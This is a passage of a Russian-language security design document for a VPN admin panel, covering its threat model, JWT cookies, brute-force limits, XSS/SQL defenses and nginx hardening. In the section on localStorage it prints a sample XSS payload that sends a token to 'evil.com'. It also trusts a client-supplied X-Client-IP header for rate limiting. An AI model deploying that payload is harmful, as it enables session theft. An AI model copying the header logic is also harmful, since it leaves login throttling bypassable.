════════════════════════════════════════════════════════════════════════════════
<!-- ФАЙЛ 9/10: 08_Безопасность.md -->
════════════════════════════════════════════════════════════════════════════════

# OlcPanel — Раздел 8: Безопасность
## Модель угроз · JWT · Изоляция · Rate Limiting · Headers · Брутфорс

> **Версия:** 2.0 | **Статус:** 🟡 В разработке
> **Принцип:** Defense-in-depth. Каждый слой защищает независимо.
>
> ⚠️ **v2.0 сдвиги модели угроз:** (1) изоляция между клиентами «шифрованием» **исчезла** — ключ общий; разграничение/блокировка теперь по `deviceId` (8.9). (2) Новый класс угроз вокруг `authz.json`/`Gate` и его митигация решением **last-known-good** — раздел **8.13**. (3) На multi-server 2FA/секретный путь/fail2ban повышаются в приоритете (центральная панель = SPOF, 8.13).
> **Зависимости:** [[03_Архитектура_сервисов]], [[05_Бизнес_логика]], [[07_Инфраструктура]]

---

## 8.1 Модель угроз (Threat Model)

### 8.1.1 Что защищаем

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    ЦЕННЫЕ АКТИВЫ (Assets)                               │
├──────────────────────────────────────┬──────────────────────────────────┤
│ Актив                                │ Что произойдёт при компрометации│
├──────────────────────────────────────┼──────────────────────────────────┤
│ crypto.key клиента                   │ Трафик клиента расшифровывается │
│ (в БД, в URI)                        │ → конфиденциальность нарушена   │
├──────────────────────────────────────┼──────────────────────────────────┤
│ Пароль администратора                │ Полный доступ к панели,         │
│                                      │ все ключи клиентов              │
├──────────────────────────────────────┼──────────────────────────────────┤
│ JWT токен администратора             │ Временный доступ к панели       │
│                                      │ (до истечения 24ч)              │
├──────────────────────────────────────┼──────────────────────────────────┤
│ olcpanel.db (SQLite файл)            │ Все ключи всех клиентов,        │
│                                      │ история платежей, конфиги       │
├──────────────────────────────────────┼──────────────────────────────────┤
│ server.yaml (OlcRTC конфиг)          │ Jitsi-сервер для туннелей       │
├──────────────────────────────────────┼──────────────────────────────────┤
│ Список клиентов и их Telegram        │ Деанонимизация клиентов         │
├──────────────────────────────────────┼──────────────────────────────────┤
│ Uptime OlcRTC-сервера                │ Отказ VPN-сервиса для всех      │
└──────────────────────────────────────┴──────────────────────────────────┘
```

### 8.1.2 Кто атакует (Threat Actors)

```
┌─────────────────────────────────────────────────────────────────────────┐
│  T1: Интернет-сканер / скрипткидди                                      │
│  Цель: брутфорс панели, стандартные CVE                                 │
│  Возможности: автоматизированные атаки                                  │
│  Митигация: rate limit + fail2ban + нестандартный порт невозможен       │
│             (HTTPS на 443 — стандарт, но Nginx перехватывает)           │
├─────────────────────────────────────────────────────────────────────────┤
│  T2: Клиент VPN                                                         │
│  Цель: получить чужой конфиг, обойти лимиты, не платить                │
│  Возможности: знает свой URI, может пробовать угадать чужой             │
│  Митигация: уникальные ключи (256-bit непредсказуемы), нет              │
│             клиентского кабинета в v1.0, нет endpoint для чужих ключей  │
├─────────────────────────────────────────────────────────────────────────┤
│  T3: Утечка данных (компрометация VPS)                                  │
│  Цель: получить все crypto.key из БД                                    │
│  Возможности: доступ к файловой системе                                 │
│  Митигация: разные ключи у каждого клиента (компрометация одного        │
│             не раскрывает остальных), быстрый revoke, short validity     │
├─────────────────────────────────────────────────────────────────────────┤
│  T4: Провайдер / регулятор (ТСПУ)                                       │
│  Цель: деанонимизация пользователей VPN                                 │
│  Возможности: DPI трафика, metadata analysis                            │
│  Митигация: это задача OlcRTC (WebRTC обфускация), не панели.           │
│             Панель минимизирует утечки в логах                          │
├─────────────────────────────────────────────────────────────────────────┤
│  T5: Несанкционированный доступ к панели                                │
│  Цель: создать бесплатные ключи, отключить платящих клиентов            │
│  Возможности: перехват cookie, XSS                                      │
│  Митигация: HttpOnly cookie (XSS не поможет), CSP, SameSite=Strict      │
└─────────────────────────────────────────────────────────────────────────┘
```

### 8.1.3 Матрица угроз и мер защиты

| Угроза | Вероятность | Ущерб | Меры защиты | Раздел |
|--------|:-----------:|:-----:|-------------|--------|
| Брутфорс пароля | Высокая | Критичный | Rate limit + bcrypt cost=12 + fail2ban | 8.3 |
| Кража JWT из localStorage | Средняя | Высокий | HttpOnly cookie — JS не видит | 8.4 |
| XSS → кража сессии | Средняя | Высокий | CSP + escapeHtml() + HttpOnly cookie | 8.5 |
| SQL-инъекция | Низкая | Критичный | SQLAlchemy ORM (параметризованные запросы) | 8.6 |
| Утечка .env / olcpanel.db | Средняя | Критичный | chmod 600 + Nginx блокирует /data/ | 8.7 |
| Доступ к чужому конфигу | Низкая | Высокий | Авторизация на всех API endpoints | 8.2 |
| CSRF-атака | Низкая | Высокий | SameSite=Strict cookie | 8.4 |
| DoS панели | Средняя | Средний | Rate limit + Nginx | 8.3 |
| Перехват трафика панели | Низкая | Средний | TLS 1.2/1.3 + HSTS | 8.8 |
| **Потеря/порча `authz.json` → бесплатный доступ всем** | **Средняя** | **Критичный** | **`Gate fail_mode: lkg` (last-known-good): сбой ≠ открытый доступ; атомарная запись; cold-start `closed`** | **8.11** |
| Откат allowlist при гонке доставки (флот) | Средняя | Высокий | Монотонный `version` + version-reject на сервере (вариант B) | 8.13 |
| Подмена/MITM доставки `authz.json` (флот) | Низкая | Критичный | `mTLS`/подпись payload, 200 только после записи | 8.13 |
| Устаревший allowlist (заблокированный ещё ходит) | Средняя | Средний | `lkg_max_age` + health-poll + alert + ручной re-push | 8.13 |
| Центральная панель — SPOF авторизации (флот) | Средняя | Высокий | Файловый контракт (серверы автономны) + бэкап БД + усиленный вход | 8.13 |

---

## 8.2 Принцип наименьших привилегий

### 8.2.1 Пользователи и их права

```
┌───────────────────────────────────────────────────────────────────────┐
│  root                                                                 │
│    • Установка пакетов                                                │
│    • Настройка systemd, Nginx, certbot                                │
│    • Настройка sudoers                                                │
│    • OlcRTC бинарник (запускается от root — существующее решение)    │
│                                                                       │
│  olcpanel (системный пользователь, нет shell, нет login)              │
│    • Запуск FastAPI/Uvicorn                                           │
│    • Чтение/запись /opt/olcpanel/data/, /logs/, /backups/             │
│    • Чтение /opt/olcpanel/ (код, .env)                               │
│    • Чтение /root/olcrtc/docs/good-carriers.md (ReadOnly)            │
│    • Чтение /root/olcrtc/server.yaml (ReadOnly → запись через sudo)  │
│    • sudo whitelist: systemctl restart/status olcrtc-server           │
│    • sudo whitelist: iptables -t mangle -L/-A/-D FORWARD             │
│    • sudo whitelist: journalctl -u olcrtc-server                      │
│                                                                       │
│  nginx (www-data)                                                     │
│    • Чтение /opt/olcpanel/static/                                     │
│    • Proxy к localhost:8000                                           │
│    • Нет доступа к /opt/olcpanel/data/ и .env                        │
│                                                                       │
│  Что НЕ может olcpanel:                                               │
│    ✗ sudo su / sudo bash                                              │
│    ✗ systemctl restart nginx / olcpanel                               │
│    ✗ Изменять /etc/, /root/ (кроме server.yaml через API)            │
│    ✗ Читать /etc/letsencrypt/ (только nginx читает сертификаты)       │
└───────────────────────────────────────────────────────────────────────┘
```

### 8.2.2 API — авторизация на каждом endpoint

```python
# app/middleware/auth_middleware.py

from fastapi import Depends, HTTPException, Cookie, Request
from sqlalchemy.orm import Session
from app.services.auth_service import AuthService
from app.database import get_db

async def get_current_admin(
    request: Request,
    access_token: str | None = Cookie(default=None),
    db: Session = Depends(get_db),
    auth_service: AuthService = Depends(),
) -> "Admin":
    """
    FastAPI Dependency для проверки аутентификации.

    Используется через Depends() на каждом защищённом endpoint.

    Порядок проверок:
      1. Cookie access_token присутствует?
      2. JWT decode: подпись + срок действия
      3. jti не в revocation list?
      4. Администратор найден в БД?
      5. Администратор активен (is_active=True)?

    При любой ошибке → 401 Unauthorized (не 403)
    Используем 401 а не 403 чтобы не раскрывать существование ресурса.
    """
    if not access_token:
        raise HTTPException(
            status_code=401,
            detail="Authentication required",
            headers={"WWW-Authenticate": "Bearer"},
        )

    admin = auth_service.verify_token(token=access_token, db=db)

    if not admin:
        # Инвалидируем cookie при невалидном токене
        raise HTTPException(
            status_code=401,
            detail="Session expired or invalid",
            headers={
                "WWW-Authenticate": "Bearer",
                "Set-Cookie": "access_token=; Max-Age=0; Path=/api; HttpOnly; Secure; SameSite=Strict",
            },
        )

    return admin


# Использование в роутерах:
# from app.middleware.auth_middleware import get_current_admin
#
# @router.get("/clients")
# async def list_clients(
#     admin = Depends(get_current_admin),
#     db: Session = Depends(get_db),
# ):
#     ...
#
# @router.post("/clients")
# async def create_client(
#     data: ClientCreate,
#     admin = Depends(get_current_admin),  # ← ОБЯЗАТЕЛЬНО на каждом endpoint
#     db: Session = Depends(get_db),
# ):
#     ...
```

---

## 8.3 Защита от брутфорса

### 8.3.1 Многоуровневая защита

```
Уровень 1: Nginx rate limit (самый внешний)
  limit_req zone=login burst=3 nodelay;
  → 5 запросов в минуту с одного IP на /api/auth/login
  → При превышении: немедленный 429 (nodelay = нет очереди)
  → Nginx блокирует до FastAPI, экономя ресурсы

Уровень 2: FastAPI in-memory rate limit (middleware)
  → Sliding window per IP
  → Login: 5 попыток / 15 минут
  → При превышении: 429 + Retry-After header
  → Синхронизирован с Nginx (Nginx строже = FastAPI редко срабатывает)

Уровень 3: bcrypt cost=12 (временная задержка)
  → Каждая проверка пароля занимает ~250 мс
  → При 5 попытках в минуту: 5 * 250ms = 1.25 сек на брутфорс серии
  → Делает онлайн-брутфорс крайне медленным

Уровень 4: fail2ban (бан на уровне iptables)
  → Смотрит /var/log/nginx/olcpanel-access.log
  → При 10 ошибках 401 за 10 минут → бан IP на 1 час
  → Полный дроп пакетов — Nginx даже не видит запрос

Уровень 5: Нет username enumeration
  → При неверном пароле И при несуществующем логине → одно сообщение
  → Время ответа одинаковое (bcrypt всегда выполняется)
```

### 8.3.2 Реализация: Login с защитой от перебора

```python
# app/services/auth_service.py

import secrets
import time
from collections import defaultdict, deque
from datetime import datetime, timedelta, timezone
from typing import Optional

from sqlalchemy.orm import Session
from passlib.context import CryptContext

from app.core.security import create_access_token, decode_access_token
from app.models.admin import Admin
from app.repositories.admin_repo import AdminRepository
from app.services.audit_service import AuditService
from app.config import get_settings

settings = get_settings()

pwd_context = CryptContext(
    schemes=["bcrypt"],
    deprecated="auto",
    bcrypt__rounds=settings.BCRYPT_ROUNDS,  # 12 из .env
)


class AuthService:
    """
    Сервис аутентификации.

    In-memory состояние:
      _revoked_jtis: set[str] — отозванные JWT (jti)
      _failed_attempts: dict[ip → deque[datetime]] — для дополнительного rate limit
    """

    _revoked_jtis: set[str] = set()
    _failed_attempts: dict[str, deque] = defaultdict(deque)

    def __init__(
        self,
        admin_repo: AdminRepository,
        audit_service: AuditService,
    ):
        self.admin_repo = admin_repo
        self.audit_service = audit_service

    def login(
        self,
        db: Session,
        username: str,
        password: str,
        ip_address: str,
    ) -> tuple[str, str]:
        """
        Аутентификация администратора.

        Возвращает: (jwt_token, jti)
        Исключение: ValueError с общим сообщением (никакой конкретики)

        Алгоритм:
          1. Всегда выполняем bcrypt verify — даже если пользователь не найден.
             Это предотвращает timing attack (по времени ответа нельзя понять,
             существует ли пользователь).

          2. Проверяем in-memory rate limit по IP.
             (Nginx rate limit — первая линия, это — вторая)

          3. Ищем пользователя в БД.
             Если не найден → bcrypt.verify против dummy hash → всё равно fail.

          4. Проверяем пароль.

          5. При ошибке: увеличиваем счётчик, пишем в audit.

          6. При успехе: создаём JWT, обновляем last_login, сбрасываем счётчик.
        """

        # Шаг 1: Проверяем rate limit (дополнительная защита поверх Nginx)
        if self._is_ip_rate_limited(ip_address):
            self.audit_service.log(
                db=db,
                action="auth.rate_limited",
                admin_id=None,
                details={"ip": ip_address, "username": username},
                ip_address=ip_address,
            )
            raise ValueError("Too many attempts")

        # ВАЖНО: Всегда делаем bcrypt verify, даже при ошибке.
        # Это гарантирует одинаковое время ответа.
        dummy_hash = "$2b$12$Oi5LxqNYGhNH6cpQ2NpHluMO5bRYPi7IHlNu.A9CJj3X9Bq9LBUV6"

        # Шаг 2: Ищем пользователя
        admin = self.admin_repo.get_by_username(db, username.lower())

        # Шаг 3: Проверяем пароль
        # Если admin None → verify против dummy (чтобы потратить то же время)
        password_hash = admin.password_hash if admin else dummy_hash
        password_valid = pwd_context.verify(password, password_hash)

        # Шаг 4: Оба условия должны быть True
        success = (admin is not None) and (admin.is_active) and password_valid

        if not success:
            # Записываем неудачную попытку
            self._record_failed_attempt(ip_address)

            self.audit_service.log(
                db=db,
                action="auth.login_failed",
                admin_id=admin.id if admin else None,
                details={
                    "ip": ip_address,
                    "username": username,
                    "reason": "invalid_credentials" if not password_valid else "inactive_account",
                },
                ip_address=ip_address,
            )

            # Одинаковое сообщение для всех случаев ошибки
            raise ValueError("Invalid credentials")

        # Шаг 5: Успешный вход
        token, jti = create_access_token(admin.id, admin.username)

        # Обновляем last_login
        self.admin_repo.update(db, admin, last_login=datetime.utcnow())

        # Сбрасываем счётчик неудачных попыток
        self._clear_failed_attempts(ip_address)

        # Аудит успешного входа
        self.audit_service.log(
            db=db,
            action="auth.login",
            admin_id=admin.id,
            details={"ip": ip_address},
            ip_address=ip_address,
        )

        return token, jti

    # ─── Rate limiting ────────────────────────────────────────────────────────

    LOGIN_MAX_ATTEMPTS = 5
    LOGIN_WINDOW_SECONDS = 900  # 15 минут

    def _is_ip_rate_limited(self, ip: str) -> bool:
        """Проверяет, превышен ли лимит попыток для данного IP."""
        now = datetime.utcnow()
        window_start = now - timedelta(seconds=self.LOGIN_WINDOW_SECONDS)
        window = self._failed_attempts[ip]

        # Убираем устаревшие записи
        while window and window[0] < window_start:
            window.popleft()

        return len(window) >= self.LOGIN_MAX_ATTEMPTS

    def _record_failed_attempt(self, ip: str) -> None:
        """Записывает неудачную попытку входа."""
        self._failed_attempts[ip].append(datetime.utcnow())

    def _clear_failed_attempts(self, ip: str) -> None:
        """Сбрасывает счётчик неудачных попыток при успешном входе."""
        if ip in self._failed_attempts:
            del self._failed_attempts[ip]

    # ─── JWT revocation ───────────────────────────────────────────────────────

    def logout(self, db: Session, jti: str, admin_id: int, ip_address: str) -> None:
        """
        Выход из системы.

        Добавляет jti в revocation list → токен становится невалидным
        даже если его exp ещё не истёк.
        """
        self._revoked_jtis.add(jti)

        self.audit_service.log(
            db=db,
            action="auth.logout",
            admin_id=admin_id,
            details={"ip": ip_address},
            ip_address=ip_address,
        )

    def revoke_all_sessions(self, db: Session, admin_id: int, ip_address: str) -> None:
        """
        Принудительно завершает все сессии администратора.

        Используется при смене пароля.

        Внимание: In-memory список не сохраняется между перезапусками.
        При перезапуске все старые токены снова становятся валидными.
        Это приемлемо для нашего масштаба (expire 24ч, один admin).
        """
        # Помечаем специальный флаг "revoke all before timestamp"
        # В verify_token проверяем: issued_at < revoke_all_before[admin_id]
        if not hasattr(self, '_revoke_all_before'):
            self._revoke_all_before: dict[int, datetime] = {}
        self._revoke_all_before[admin_id] = datetime.utcnow()

        self.audit_service.log(
            db=db,
            action="auth.revoke_all_sessions",
            admin_id=admin_id,
            details={"ip": ip_address, "reason": "password_changed"},
            ip_address=ip_address,
        )

    def verify_token(self, token: str, db: Session) -> Optional[Admin]:
        """
        Полная проверка JWT токена.

        Порядок проверок:
          1. JWT decode (подпись + exp)
          2. Не в revocation list (jti)
          3. Не отозваны все сессии (iat > revoke_all_before)
          4. Администратор найден и активен в БД

        Возвращает Admin или None (не бросает исключений — это делает caller).
        """
        payload = decode_access_token(token)
        if not payload:
            return None

        # Проверка revocation list
        jti = payload.get("jti")
        if jti and jti in self._revoked_jtis:
            return None

        # Проверка revoke_all
        admin_id_str = payload.get("sub")
        if not admin_id_str:
            return None

        admin_id = int(admin_id_str)

        if hasattr(self, '_revoke_all_before') and admin_id in self._revoke_all_before:
            revoke_before = self._revoke_all_before[admin_id]
            issued_at = payload.get("iat")
            if issued_at:
                token_issued = datetime.fromtimestamp(issued_at, tz=timezone.utc).replace(tzinfo=None)
                if token_issued < revoke_before:
                    return None

        # Проверка в БД
        admin = self.admin_repo.get_by_id(db, admin_id)
        if not admin or not admin.is_active:
            return None

        return admin

    def cleanup_revoked_tokens(self) -> None:
        """
        Очищает revocation list от истёкших токенов.
        Вызывается APScheduler раз в час.

        Поскольку exp у нас 24 часа, то через 24 часа токены
        в любом случае не пройдут decode_access_token.
        Можно просто очищать всё что старше 25 часов.

        Упрощённо: очищаем весь список раз в сутки.
        Размер: максимум 1 запись (один admin, один logout в день).
        """
        self._revoked_jtis.clear()
        if hasattr(self, '_revoke_all_before'):
            cutoff = datetime.utcnow() - timedelta(hours=25)
            self._revoke_all_before = {
                k: v for k, v in self._revoke_all_before.items()
                if v > cutoff
            }
```

---

## 8.4 Cookie Security

### 8.4.1 Параметры JWT cookie

```python
# app/routers/auth.py — фрагмент

from fastapi import APIRouter, Response, Request, Depends
from app.schemas.auth import LoginRequest, TokenResponse
from app.services.auth_service import AuthService
from app.config import get_settings

settings = get_settings()
router = APIRouter()


@router.post("/login", response_model=TokenResponse)
async def login(
    request: Request,
    data: LoginRequest,
    response: Response,
    auth_service: AuthService = Depends(),
    db: Session = Depends(get_db),
):
    client_ip = request.headers.get("X-Real-IP") or \
                request.headers.get("X-Client-IP") or \
                (request.client.host if request.client else "unknown")

    token, jti = auth_service.login(
        db=db,
        username=data.username,
        password=data.password,
        ip_address=client_ip,
    )

    # Устанавливаем httpOnly cookie
    response.set_cookie(
        key="access_token",
        value=token,
        httponly=True,         # JavaScript не может прочитать (защита от XSS)
        secure=True,           # Только HTTPS (не передаётся по HTTP)
        samesite="strict",     # CSRF защита: cookie не отправляется с других сайтов
        path="/api",           # Cookie доступна только для /api/* путей
        max_age=86400,         # 24 часа в секундах
    )

    return TokenResponse(
        token_type="bearer",
        expires_in=86400,
        admin_username=data.username,
    )


@router.post("/logout")
async def logout(
    request: Request,
    response: Response,
    access_token: str | None = Cookie(default=None),
    admin = Depends(get_current_admin),
    auth_service: AuthService = Depends(),
    db: Session = Depends(get_db),
):
    client_ip = request.headers.get("X-Real-IP", request.client.host)

    if access_token:
        payload = decode_access_token(access_token)
        if payload and payload.get("jti"):
            auth_service.logout(db, payload["jti"], admin.id, client_ip)

    # Очищаем cookie: Max-Age=0 немедленно удаляет её
    response.delete_cookie(
        key="access_token",
        httponly=True,
        secure=True,
        samesite="strict",
        path="/api",
    )

    return {"message": "Logged out successfully", "success": True}
```

### 8.4.2 Почему не localStorage

```
localStorage / sessionStorage имеют критическую уязвимость:
  Любой JavaScript код на странице может читать localStorage.
  Если атакующий внедрит JS (XSS, через третий CDN, через зависимость),
  он сразу получит JWT токен.

  Пример атаки:
    1. Атакующий находит XSS на странице (даже в toast сообщении)
    2. Инжектирует: <script>fetch('evil.com?t='+localStorage.getItem('token'))</script>
    3. Получает JWT → полный доступ до истечения (24 часа)

httpOnly Cookie защищает от этого:
  - JavaScript не может прочитать httpOnly cookie никак
  - Даже eval() / document.cookie не видит её
  - Только браузер автоматически отправляет её с каждым запросом

  При XSS атаке: атакующий может делать запросы от имени пользователя
  (browser still sends cookie), но не может украсть сам токен.

  SameSite=Strict предотвращает CSRF:
  - Cookie отправляется ТОЛЬКО если запрос инициирован с нашего домена
  - Переход по ссылке с другого сайта → cookie не прикрепляется
```

---

## 8.5 XSS Prevention

### 8.5.1 Правила безопасного HTML в JavaScript

```javascript
// ❌ НИКОГДА так (уязвимо к XSS):
element.innerHTML = userInput;                    // XSS
element.innerHTML = `<p>${userData.name}</p>`;    // XSS
document.write(userInput);                        // XSS

// ✅ ВСЕГДА так (безопасно):

// 1. textContent для текстового содержимого
element.textContent = userData.name;

// 2. escapeHtml() перед вставкой в HTML строки
element.innerHTML = `<p>${escapeHtml(userData.name)}</p>`;

// 3. DOM API вместо innerHTML
const p = document.createElement('p');
p.textContent = userData.name;
container.appendChild(p);

// Функция escapeHtml из utils.js:
function escapeHtml(str) {
  if (str === null || str === undefined) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

// ВНИМАНИЕ: escapeHtml экранирует HTML. Для URL нужен отдельный encode:
function encodeURIComponentSafe(str) {
  return encodeURIComponent(String(str || ''));
}
```

### 8.5.2 Content Security Policy

```nginx
# В Nginx конфиге (из 07_Инфраструктура):
add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' https://cdn.jsdelivr.net;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data:;
    font-src 'self';
    connect-src 'self';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
" always;
```

**Разбор директив:**

| Директива | Значение | Зачем |
|-----------|----------|-------|
| `default-src 'self'` | По умолчанию — только наш домен | Запрещает загрузку всего внешнего |
| `script-src 'self' cdn.jsdelivr.net` | JS только с нашего сайта + Chart.js CDN | Предотвращает инъекцию JS с внешних источников |
| `style-src 'self' 'unsafe-inline'` | CSS + inline-стили | `unsafe-inline` нужен для динамических стилей (прогресс-бар width) |
| `img-src 'self' data:` | Картинки + data: URI | data: нужен для QR-кода (base64 PNG) |
| `frame-ancestors 'none'` | Никто не может встроить панель во фрейм | Защита от clickjacking |
| `form-action 'self'` | Форма отправляется только на наш сайт | Защита от phishing redirect |

**Примечание о `unsafe-inline` в style-src:**
В v1.0 используем `unsafe-inline` для простоты (inline стили в шаблонах). В v1.5 можно убрать через nonce или переход к CSS-классам.

---

## 8.6 SQL Injection Prevention

### 8.6.1 SQLAlchemy ORM — параметризованные запросы

```python
# ❌ НИКОГДА так (уязвимо):
db.execute(f"SELECT * FROM clients WHERE name = '{user_input}'")
db.execute("SELECT * FROM clients WHERE id = " + str(user_id))

# ✅ SQLAlchemy ORM (всегда параметризованно):
# ORM автоматически использует placeholders: WHERE name = ?

# Правильный способ:
client = db.query(Client).filter(Client.name == user_input).first()
# SQLAlchemy генерирует: SELECT ... WHERE clients.name = :name_1
# и передаёт user_input как параметр (не в строке запроса)

# ILIKE для поиска (тоже параметризованно):
clients = db.query(Client).filter(
    Client.name.ilike(f"%{user_input}%")
).all()
# SQLAlchemy: WHERE clients.name ILIKE :name_1
# Параметр: %{user_input}%

# Если нужен raw SQL (избегать!), то только через text() с параметрами:
from sqlalchemy import text
result = db.execute(
    text("SELECT * FROM clients WHERE id = :id"),
    {"id": user_id}  # параметр, не строка
)
```

### 8.6.2 Pydantic валидация входных данных

```python
# Pydantic v2 валидирует все входные данные автоматически

class ClientCreate(BaseModel):
    name: str = Field(min_length=1, max_length=128)    # длина ограничена
    telegram: Optional[str] = Field(default=None, max_length=128)
    plan_id: int = Field(gt=0)                          # только положительные числа

    @field_validator("telegram")
    @classmethod
    def validate_telegram(cls, v: str | None) -> str | None:
        if v is None:
            return v
        # Проверяем что это @username или числовой ID
        if v.startswith("@") and len(v) > 1 and v[1:].replace("_", "").replace(".", "").isalnum():
            return v
        if v.isdigit():
            return v
        raise ValueError("Invalid telegram format")

# FastAPI автоматически возвращает 422 при ошибке валидации:
# {"detail": [{"loc": ["body", "name"], "msg": "...", "type": "..."}]}
```

---

## 8.7 Защита файлов и секретов

### 8.7.1 Права доступа к файлам

```bash
# === Минимальные права ===

# .env — только владелец может читать
chmod 600 /opt/olcpanel/.env
chown olcpanel:olcpanel /opt/olcpanel/.env

# База данных
chmod 600 /opt/olcpanel/data/olcpanel.db
chown olcpanel:olcpanel /opt/olcpanel/data/olcpanel.db
chmod 700 /opt/olcpanel/data/

# Бэкапы
chmod 600 /opt/olcpanel/backups/*.db.gz
chmod 700 /opt/olcpanel/backups/

# Логи — читать могут другие (для мониторинга), писать — только olcpanel
chmod 644 /opt/olcpanel/logs/app.log
chmod 600 /opt/olcpanel/logs/audit.log    # audit — только olcpanel
chmod 755 /opt/olcpanel/logs/

# Код приложения — readable (не секретный)
chmod 644 /opt/olcpanel/app/**/*.py
chmod 644 /opt/olcpanel/requirements.txt
```

### 8.7.2 Nginx блокирует доступ к чувствительным файлам

```nginx
# В /etc/nginx/conf.d/olcpanel.conf (из 07_Инфраструктура):

# Блокируем прямой доступ к данным через HTTP
location /data/    { deny all; return 404; }
location /logs/    { deny all; return 404; }
location /venv/    { deny all; return 404; }
location /backups/ { deny all; return 404; }
location /scripts/ { deny all; return 404; }
location /alembic/ { deny all; return 404; }

# Скрытые файлы и директории (.env, .git, .gitignore и т.д.)
location ~ /\. {
    deny all;
    return 404;
}

# Python файлы напрямую не раздаём
location ~ \.py$ {
    deny all;
    return 404;
}

# Swagger только с localhost
location = /api/docs {
    allow 127.0.0.1;
    deny all;
}
```

### 8.7.3 Что НЕ должно попасть в git

```gitignore
# Секреты и данные — никогда в git
.env
*.env.local

# База данных
data/
*.db
*.db-wal
*.db-shm

# Бэкапы
backups/

# Логи
logs/
*.log

# Python runtime
venv/
__pycache__/
*.pyc

# Сертификаты (они на сервере, не в репозитории)
*.pem
*.key
*.crt
```

### 8.7.4 SECRET_KEY — генерация и ротация

```bash
# При установке — генерируем случайный SECRET_KEY:
SECRET_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
echo "SECRET_KEY=$SECRET_KEY" >> /opt/olcpanel/.env

# Требования к SECRET_KEY:
# - Минимум 32 байта (64 hex символа)
# - Криптографически случайный (secrets.token_hex, НЕ random.random)
# - Нигде не логируется
# - При смене — все активные JWT токены становятся невалидными (мгновенный logout всех)

# Проверка в config.py:
class Settings(BaseSettings):
    SECRET_KEY: str

    @field_validator("SECRET_KEY")
    @classmethod
    def validate_secret_key(cls, v: str) -> str:
        if len(v) < 64:
            raise ValueError(
                "SECRET_KEY must be at least 64 characters (32 bytes). "
                "Generate with: python3 -c \"import secrets; print(secrets.token_hex(32))\""
            )
        return v
```

---

## 8.8 Security Headers — полный анализ

### 8.8.1 Все заголовки и их назначение

```
HTTP Response Headers (устанавливаются Nginx):

┌─────────────────────────────────────────────────────────────────────────┐
│  Strict-Transport-Security: max-age=63072000; includeSubDomains; preload│
│                                                                         │
│  Зачем: HSTS — браузер запоминает что этот домен только HTTPS.          │
│         При попытке открыть http:// → браузер сам переключает на https  │
│         (без запроса к серверу → защита от SSL stripping атак).         │
│         max-age=63072000 = 2 года.                                      │
│         preload — можно добавить домен в Chrome preload list.           │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│  X-Frame-Options: DENY                                                  │
│                                                                         │
│  Зачем: Запрещает встроить панель в <iframe>.                          │
│         Защита от clickjacking: атакующий не может создать              │
│         прозрачный iframe поверх своей страницы.                        │
│         frame-ancestors 'none' в CSP делает то же (современные браузеры)│
│         X-Frame-Options — для старых браузеров.                        │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│  X-Content-Type-Options: nosniff                                        │
│                                                                         │
│  Зачем: Запрещает браузеру "угадывать" Content-Type файла.             │
│         Без этого заголовка: злоумышленник загружает файл с расширением │
│         .jpg но содержимым JS → браузер может выполнить его как JS.    │
│         С nosniff: браузер строго следует Content-Type от сервера.     │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│  X-XSS-Protection: 1; mode=block                                        │
│                                                                         │
│  Зачем: Включает встроенный XSS-фильтр браузера.                       │
│         mode=block — блокирует страницу целиком при обнаружении XSS    │
│         (вместо попытки "починить" — это может само стать атакой).     │
│         Устаревший заголовок (современные браузеры игнорируют),        │
│         но безвреден для совместимости.                                 │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│  Referrer-Policy: strict-origin-when-cross-origin                       │
│                                                                         │
│  Зачем: При переходе по ссылкам не передаём полный URL в Referer.      │
│         Если admin случайно кликнет ссылку на внешний сайт,            │
│         тот не узнает полный URL страницы панели (включая #hash params) │
└─────────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────────┐
│  Permissions-Policy: camera=(), microphone=(), geolocation=()           │
│                                                                         │
│  Зачем: Явно запрещаем использование browser API для камеры/микро/гео. │
│         Панель управления VPN не должна их запрашивать.                │
│         Даже если XSS произошёл — атакующий не получит доступ к ним.  │
└─────────────────────────────────────────────────────────────────────────┘
```

### 8.8.2 FastAPI Security Headers Middleware

```python
# app/middleware/security_headers.py

from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from starlette.responses import Response

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    """
    Добавляет security headers к каждому ответу FastAPI.

    Nginx также добавляет их — это резервный слой на случай
    если запрос обходит Nginx (например, прямой доступ к :8000 изнутри сервера).

    В production запросы снаружи НЕ должны попадать напрямую на :8000
    (порт привязан к 127.0.0.1). Nginx — единственная точка входа.
    """

    HEADERS = {
        "X-Frame-Options":           "DENY",
        "X-Content-Type-Options":    "nosniff",
        "X-XSS-Protection":          "1; mode=block",
        "Referrer-Policy":           "strict-origin-when-cross-origin",
        "Permissions-Policy":        "camera=(), microphone=(), geolocation=()",
        "Cache-Control":             "no-store",           # API ответы не кэшируем
        "X-Request-ID":              "",                    # заполняется ниже
    }

    async def dispatch(self, request: Request, call_next) -> Response:
        response = await call_next(request)

        for header, value in self.HEADERS.items():
            if header == "X-Request-ID":
                # Уникальный ID для трассировки запроса в логах
                import uuid
                response.headers[header] = str(uuid.uuid4())[:8]
            elif header not in response.headers:
                response.headers[header] = value

        # Для API ответов — запрет кэширования
        if request.url.path.startswith("/api/"):
            response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
            response.headers["Pragma"] = "no-cache"

        return response
```

---

## 8.9 Изоляция и блокировка клиентов (v2.0: общий ключ + `deviceId`)

> ⚠️ **Важная смена модели (Решение 1).** v1.x строила изоляцию на **уникальном `crypto.key` на клиента**. В v2.0 ключ и комната **общие** — поэтому «изоляция шифрованием между клиентами» больше **не свойство системы**. Защита/разграничение переехали на уровень **членства `deviceId` в `authz.json`** и блокировки через `Gate`. Подраздел 8.9.2 (генерация уникального ключа) сохранён как **LEGACY** и в v2.0 не вызывается.

